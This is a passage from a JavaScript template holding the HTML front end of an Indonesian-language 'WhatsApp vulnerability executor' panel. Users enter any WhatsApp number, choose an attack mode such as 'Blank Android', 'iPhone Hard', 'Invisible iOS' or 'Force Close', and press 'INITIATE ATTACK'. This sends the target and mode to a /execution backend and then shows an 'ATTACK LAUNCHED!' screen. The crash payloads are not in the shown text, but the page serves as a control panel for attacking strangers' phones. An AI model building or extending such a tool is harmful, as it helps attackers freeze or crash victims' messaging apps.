            border-radius: 2px;
        }

        .menu-toggle.active span:nth-child(1) {
            transform: rotate(45deg) translate(5px, 5px);
            background: var(--accent-white);
        }

        .menu-toggle.active span:nth-child(2) {
            opacity: 0;
        }

        .menu-toggle.active span:nth-child(3) {
            transform: rotate(-45deg) translate(7px, -6px);
            background: var(--accent-white);
        }

        .bug-dropdown {
            max-width: 600px;
            margin: 0 auto 30px;
            background: var(--carbon-dark);
            border: 1px solid var(--accent-dark-silver);
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
            max-height: 0;
            overflow: hidden;
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.4, 0.0, 0.2, 1);
        }

        .bug-dropdown.active {
            max-height: 500px;
            opacity: 1;
            padding: 20px;
        }

        .bug-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
        }

        .bug-card {
            background: var(--carbon-medium);
            border: 1px solid var(--accent-dark-silver);
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            transition: all 0.3s ease;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 120px;
        }

        .bug-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.1);
            border-color: var(--accent-silver);
            background: var(--carbon-light);
        }

        .bug-card.selected {
            border: 2px solid var(--accent-white);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
            transform: scale(1.05);
            background: var(--carbon-light);
        }

        .bug-card-icon {
            width: 40px;
            height: 40px;
            margin-bottom: 10px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent-white), var(--accent-silver));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            box-shadow: 0 3px 10px rgba(255, 255, 255, 0.4);
            color: var(--primary-black);
        }

        .bug-card-title {
            font-family: 'Orbitron', monospace;
            font-size: 12px;
            font-weight: 700;
            margin-bottom: 5px;
            text-transform: uppercase;
            color: var(--accent-white);
        }

        .bug-card-cta {
            padding: 6px 12px;
            background: linear-gradient(135deg, var(--accent-white), var(--accent-silver));
            border: none;
            border-radius: 15px;
            color: var(--primary-black);
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 10px;
            font-family: 'Orbitron', monospace;
            margin-top: 5px;
        }

        .bug-card-cta:hover {
            transform: translateY(-2px);
            box-shadow: 0 3px 8px rgba(255, 255, 255, 0.4);
        }

        .execute-section {
            text-align: center;
            padding: 40px 16px;
        }

        .execute-btn {
            padding: 18px 50px;
            background: linear-gradient(135deg, var(--accent-white), var(--accent-silver));
            border: none;
            border-radius: 30px;
            color: var(--carbon-dark);
            font-weight: 900;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 16px;
            font-family: 'Orbitron', monospace;
            box-shadow: 0 5px 20px rgba(255, 255, 255, 0.4);
        }

        .execute-btn:hover {
            transform: translateY(-3px);
            background: var(--accent-white);
            box-shadow: 0 8px 30px rgba(255, 255, 255, 0.6);
        }

        .execute-btn:active {
            transform: translateY(-1px);
        }

        .bottom-actions {
            text-align: center;
            padding: 20px;
            margin-top: 40px;
        }

        .back-to-dashboard-btn {
            display: inline-block;
            padding: 15px 30px;
            background: var(--carbon-medium);
            color: var(--accent-silver);
            text-decoration: none;
            border-radius: 30px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 1px solid var(--accent-dark-silver);
            font-family: 'Orbitron', monospace;
            font-size: 14px;
        }

        .back-to-dashboard-btn:hover {
            background: var(--carbon-light);
            color: var(--accent-white);
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.2);
        }

        .attack-success-notification {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, rgba(30, 30, 30, 0.95), rgba(10, 10, 10, 0.95));
            color: white;
            padding: 30px 40px;
            border-radius: 20px;
            text-align: center;
            z-index: 10002;
            box-shadow: 0 0 50px rgba(255, 255, 255, 0.4);
            border: 2px solid var(--accent-silver);
            backdrop-filter: blur(10px);
            animation: attackSuccess 0.8s cubic-bezier(0.4, 0.0, 0.2, 1) forwards;
            max-width: 400px;
            width: 90%;
        }

        .attack-success-icon {
            font-size: 4rem;
            margin-bottom: 15px;
            display: block;
            color: var(--success-color);
            animation: bounce 1s ease infinite alternate;
        }

        @keyframes bounce {
            from { transform: scale(1); }
            to { transform: scale(1.1); }
        }

        .attack-success-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: var(--accent-white);
        }

        .attack-success-message {
            font-size: 1rem;
            margin-bottom: 20px;
            opacity: 0.9;
        }

        .attack-progress {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 3px;
            overflow: hidden;
            margin-top: 15px;
        }

        .attack-progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--success-color), #8BC34A);
            width: 0%;
            transition: width 2s linear;
            border-radius: 3px;
        }

        .attack-countdown {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            color: var(--accent-silver);
            margin-top: 10px;
            font-weight: 700;
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background: var(--accent-silver);
            opacity: 0;
            z-index: 10001;
        }

        .confetti:nth-child(odd) {
            background: var(--accent-white);
        }

        .confetti:nth-child(even) {
            background: var(--success-color);
        }

        @keyframes attackSuccess {
            0% {
                transform: translate(-50%, -50%) scale(0.3);
                opacity: 0;
            }
            50% {
                transform: translate(-50%, -50%) scale(1.1);
                opacity: 1;
            }
            70% {
                transform: translate(-50%, -50%) scale(1.05);
            }
            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }
        }

        @keyframes confettiFall {
            0% {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(100vh) rotate(360deg);
                opacity: 0;
            }
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        @media (max-width: 768px) {
            .hero-title {
                font-size: 2.2rem;
            }
            .target-image-container {
                height: 200px;
            }
            .target-text {
                font-size: 16px;
            }
            .bug-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="grid-bg"></div>

    <section class="hero">
        <div style="width: 100%; max-width: 1200px; padding: 0 15px;">
            <div class="hero-content">
                <h1 class="hero-title">EXECUTION</h1>
                <p class="hero-subtitle">Sistem Pengeksekusi Kerentanan WhatsApp International Support</p>
            </div>

            <div class="target-image-section">
                <div class="target-image-container">
                    <div class="target-image">
                        <img src="https://files.catbox.moe/3gejhx.jpg" alt="Target Image 1" class="active">
                        <img src="https://files.catbox.moe/axwm3h.jpg" alt="Target Image 2">
                        <img src="https://files.catbox.moe/qf8po7.jpeg" alt="Target Image 3">
                        <div class="target-image-overlay">
                            <div class="target-text-container">
                                <div class="target-text">INDICTIVE CORE VERSION 3</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <p class="target-description">
                    Masukan nomor target <b>WhatsApp</b> dari negara manapun.
                </p>
            </div>

            <div class="input-section">
                <div class="input-group">
                    <label class="input-label" for="numberInput">
                        <i class="fas fa-globe-americas"></i> TARGET NUMBER
                    </label>
                    <input 
                        type="text" 
                        id="numberInput" 
                        class="input-field" 
                        placeholder="Contoh: 628123xxx"
                    />
                </div>
            </div>

            <div class="menu-toggle-container">
                <div class="menu-toggle" id="menuToggle">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>

            <div class="bug-dropdown" id="bugDropdown">
                <div class="bug-grid" id="bugGrid"></div>
            </div>

            <div class="execute-section">
                <button id="executeBtn" class="execute-btn">
                    <i class="fas fa-radiation"></i> INITIATE ATTACK
                </button>
            </div>
            
            <div class="bottom-actions">
                <a href="/dashboard" class="back-to-dashboard-btn" id="backToDashboardBtn">
                    <i class="fas fa-arrow-left"></i> KEMBALI KE DASHBOARD
                </a>
            </div>
        </div>
    </section>

    <script>
        // State variables
        let selectedBugType = null;
        const bugGrid = document.getElementById('bugGrid');
        const menuToggle = document.getElementById('menuToggle');
        const bugDropdown = document.getElementById('bugDropdown');

        // Data bugTypes yang SESUAI - hanya judul sederhana
        const bugTypes = [
            {
                id: 'delay',
                icon: '<i class="fas fa-hourglass-half"></i>',
                title: '50% Delay'
            },
            {
                id: 'medium',
                icon: '<i class="fas fa-tachometer-alt"></i>',
                title: '100% Delay'
            },
            {
                id: 'blank-ios',
                icon: '<i class="fab fa-apple"></i>',
                title: 'iPhone Hard'
            },
            {
                id: 'blank',
                icon: '<i class="fab fa-android"></i>',
                title: 'Blank Android'
            },
            {
                id: 'fcinvsios',
                icon: '<i class="fas fa-eye-slash"></i>',
                title: 'Invisible iOS'
            },
            {
                id: 'force-close',
                icon: '<i class="fas fa-power-off"></i>',
                title: 'Force Close'
            }
        ];

        // Function untuk slideshow gambar
        function initImageSlideshow() {
            const images = document.querySelectorAll('.target-image img');
            let currentIndex = 0;
            
            setInterval(() => {
                images.forEach(img => img.classList.remove('active'));
                currentIndex = (currentIndex + 1) % images.length;
                images[currentIndex].classList.add('active');
            }, 5000);
        }

        function createBugCard(data) {
            const card = document.createElement('div');
            card.className = 'bug-card';
            card.dataset.bugId = data.id;
            
            card.innerHTML = \`
                <div class="bug-card-icon">\${data.icon}</div>
                <h3 class="bug-card-title">\${data.title}</h3>
                <button class="bug-card-cta">SELECT</button>
            \`;
            
            card.addEventListener('click', () => selectBugType(card, data.id));
            
            return card;
        }

        function initBugGrid() {
            // Menggunakan data bugTypes yang sudah didefinisikan
            bugTypes.forEach((data) => {
                const card = createBugCard(data);
                bugGrid.appendChild(card);
            });
        }

        function selectBugType(card, bugId) {
            document.querySelectorAll('.bug-card').forEach(c => {
                c.classList.remove('selected');
            });
            
            card.classList.add('selected');
            selectedBugType = bugId;
            
            const button = card.querySelector('.bug-card-cta');
            button.textContent = '✓ SELECTED';
            
            document.querySelectorAll('.bug-card-cta').forEach(btn => {
                if (btn !== button) {
                    btn.textContent = 'SELECT';
                }
            });
            
            setTimeout(() => {
                toggleDropdown();
            }, 800);
        }

        function toggleDropdown() {
            menuToggle.classList.toggle('active');
            bugDropdown.classList.toggle('active');
        }

        // Validasi nomor internasional
        function isValidPhoneNumber(number) {
            const cleanedNumber = number.replace(/\\D/g, '');
            
            if (cleanedNumber.length < 7 || cleanedNumber.length > 15) {
                return false;
            }
            
            if (cleanedNumber.startsWith('0')) {
                return false;
            }
            
            return true;
        }

        // Execute button handler dengan POST
        document.getElementById('executeBtn').addEventListener('click', async () => {
            const number = document.getElementById('numberInput').value.trim().replace(/\\s+/g, '');
            
            if (!number) {
                showNotification('Masukan nomor target terlebih dahulu!', 'error');
                return;
            }
            
            if (!isValidPhoneNumber(number)) {
                showNotification('Masukan nomor yang valid! Contoh: 628123xxx (Indonesia), 14155552671 (US), 447123456789 (UK)', 'error');
                return;
            }
            
            if (!selectedBugType) {
                showNotification('Pilih jenis bug terlebih dahulu!', 'error');
                return;
            }
            
            // Tampilkan loading
            const executeBtn = document.getElementById('executeBtn');
            const originalText = executeBtn.innerHTML;
            executeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MEMPROSES...';
            executeBtn.disabled = true;
            
            try {
                // Kirim request POST
                const response = await fetch('/execution', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        target: number,
                        mode: selectedBugType
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showAttackSuccessNotification(number, selectedBugType);
                } else {
                    showNotification(data.error || 'Terjadi kesalahan!', 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Terjadi kesalahan jaringan!', 'error');
            } finally {
                // Reset button
                executeBtn.innerHTML = originalText;
                executeBtn.disabled = false;
            }
        });

        // Function untuk menampilkan notifikasi sukses attack
        function showAttackSuccessNotification(number, bugType) {
            // Cari data bug yang sesuai untuk mendapatkan title yang benar
            const bugData = bugTypes.find(bug => bug.id === bugType);
            const bugTitle = bugData ? bugData.title : bugType.toUpperCase();
            
            const overlay = document.createElement('div');
            overlay.className = 'attack-overlay';
            document.body.appendChild(overlay);

            const notification = document.createElement('div');
            notification.className = 'attack-success-notification';
            notification.innerHTML = \`
                <div class="attack-success-icon">
                    <i class="fas fa-globe-americas"></i>
                </div>
                <h2 class="attack-success-title">ATTACK LAUNCHED!</h2>
                <p class="attack-success-message">
                    <strong>\${bugTitle}</strong> berhasil dikirim ke<br>
                    <strong>\${number}</strong>
                </p>
                <div class="attack-countdown" id="countdown">Mengarahkan dalam 3 detik...</div>
                <div class="attack-progress">
                    <div class="attack-progress-bar" id="progressBarAttack"></div>
                </div>
            \`;
            document.body.appendChild(notification);

            createConfetti();

            setTimeout(() => {
                const progressBar = document.getElementById('progressBarAttack');
                progressBar.style.width = '100%';
            }, 100);

            let countdown = 3;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = \`Mengarahkan dalam \${countdown} detik...\`;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = '/execution';
                }
            }, 1000);
        }

        // Function untuk membuat efek confetti
        function createConfetti() {
            const colors = ['var(--accent-silver)', 'var(--accent-white)', 'var(--success-color)'];
            
            for (let i = 0; i < 50; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.width = Math.random() * 10 + 5 + 'px';
                confetti.style.height = Math.random() * 10 + 5 + 'px';
                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animation = \`confettiFall \${Math.random() * 3 + 2}s linear forwards\`;
                confetti.style.animationDelay = Math.random() * 2 + 's';
                
                document.body.appendChild(confetti);
                
                setTimeout(() => {
                    if (confetti.parentNode) {
                        confetti.parentNode.removeChild(confetti);
                    }
                }, 5000);
            }
        }

        // Function untuk menampilkan notifikasi biasa
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            const bgColor = type === 'error' ? 'var(--error-color)' : 
                           type === 'success' ? 'var(--success-color)' : 
                           'var(--accent-dark-silver)';
            
            notification.style.cssText = \`
                position: fixed;
                top: 20px;
                right: 20px;
                background: \${bgColor};
                color: white;
                padding: 15px 20px;
                border-radius: 10px;
                z-index: 10001;
                max-width: 400px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                animation: slideIn 0.3s ease;
            \`;
            
            notification.innerHTML = \`
                <div style="display: flex; align-items: center; gap: 10px;">
                    <i class="fas fa-\${type === 'error' ? 'exclamation-triangle' : type === 'success' ? 'check-circle' : 'info-circle'}"></i>
                    <span>\${message}</span>
                </div>
            \`;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 5000);
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            initBugGrid();
            initImageSlideshow();

            menuToggle.addEventListener('click', toggleDropdown);

            // Ambil parameter dari URL
            const urlParams = new URLSearchParams(window.location.search);
            const fromDashboard = urlParams.get('from') || 'dashboard';
            
            // Atur tombol kembali
            const backButton = document.querySelector('.back-to-dashboard-btn');
            backButton.href = fromDashboard === 'dashboard2' ? '/dashboard2' : '/dashboard';
        });
    </script>
</body>
</html>`;
};